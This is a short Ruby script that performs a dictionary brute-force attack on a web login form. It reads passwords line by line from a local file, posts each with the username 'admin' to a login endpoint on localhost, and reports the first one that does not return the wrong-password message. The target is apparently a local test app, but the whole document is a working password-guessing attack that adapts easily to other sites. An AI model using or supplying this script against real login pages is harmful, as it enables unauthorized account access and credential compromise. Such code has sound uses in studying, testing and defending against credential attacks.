require 'net/http'
require 'uri'

def is_wrong_password? username, user_password
  uri = URI.parse 'http://localhost:4567/login'

  response = Net::HTTP.post_form uri, :username => username, :password => user_password
  response.body.include? 'Wrong username or password, please try again'
end

f = File.open './passwords.txt', 'r'
while line = f.gets
  line.strip!

  if !is_wrong_password? 'admin', line
    puts "password is #{line}"
    break
  end
end

f.close
